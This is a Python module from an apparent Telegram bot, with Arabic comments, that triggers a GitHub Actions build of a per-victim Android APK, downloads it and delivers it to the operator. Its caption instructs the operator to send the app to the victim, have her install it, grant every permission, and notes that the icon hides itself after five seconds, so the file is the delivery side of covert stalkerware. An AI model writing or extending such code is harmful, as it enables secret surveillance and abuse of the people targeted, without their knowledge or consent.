# bot_handlers/apk_builder.py
# ============================================================
# بناء APK + إرساله (منفصل بسبب الحجم)
# ============================================================

import io
import requests

from config import bot, GITHUB_TOKEN
from utils import trigger_victim_apk_build, get_victim_apk_url
from logging_config import get_logger

logger = get_logger("bot_handlers.apk_builder")


def _build_and_send_apk(chat_id, victim_name, victim_token, wait_msg_id):
    """يبني APK وينتظر الـ release ثم يرسله"""

    if not GITHUB_TOKEN:
        try:
            bot.edit_message_text(
                f"⚠️ <b>GITHUB_TOKEN غير مضبوط</b>\n\n"
                f"🔑 <b>كود الضحية:</b>\n<code>{victim_token}</code>",
                chat_id=chat_id, message_id=wait_msg_id,
                parse_mode="HTML"
            )
        except Exception:
            pass
        return

    success = trigger_victim_apk_build(victim_token, victim_name)
    if not success:
        try:
            bot.edit_message_text(
                "❌ <b>فشل تشغيل البناء</b>",
                chat_id=chat_id, message_id=wait_msg_id,
                parse_mode="HTML"
            )
        except Exception:
            pass
        return

    try:
        bot.edit_message_text(
            "✅ <b>تم تشغيل البناء بنجاح</b>\n\n"
            "⏳ <i>جاري انتظار GitHub Actions...</i>",
            chat_id=chat_id, message_id=wait_msg_id,
            parse_mode="HTML"
        )
    except Exception:
        pass

    apk_url = get_victim_apk_url(victim_token, max_wait=900)

    if not apk_url:
        try:
            bot.edit_message_text(
                f"⏰ <b>انتهت مهلة الانتظار</b>\n\n"
                f"👤 <code>{victim_name}</code>",
                chat_id=chat_id, message_id=wait_msg_id,
                parse_mode="HTML"
            )
        except Exception:
            pass
        return

    try:
        r = requests.get(apk_url, timeout=120, allow_redirects=True)
        if r.status_code == 200 and len(r.content) > 10000:
            apk_buffer = io.BytesIO(r.content)
            apk_buffer.name = f"Victim_{victim_name}.apk"

            try:
                bot.delete_message(chat_id, wait_msg_id)
            except Exception:
                pass

            bot.send_document(
                chat_id, apk_buffer,
                caption=(
                    f"✅ <b>APK جاهز للضحية</b> <code>{victim_name}</code>\n"
                    f"━━━━━━━━━━━━━━━━━━\n\n"
                    f"📋 <b>الخطوات:</b>\n"
                    f"1. أرسل APK للضحية\n"
                    f"2. تثبّته على تليفونها\n"
                    f"3. <b>تفتحه وتوافق على كل الصلاحيات</b>\n"
                    f"4. تختفي الأيقونة بعد 5 ثواني"
                ),
                parse_mode="HTML"
            )
        else:
            bot.send_message(chat_id, "❌ فشل تحميل APK", parse_mode="HTML")
    except Exception as e:
        logger.exception(f"APK download error: {e}")
        bot.send_message(chat_id, f"❌ خطأ التحميل: {e}", parse_mode="HTML")
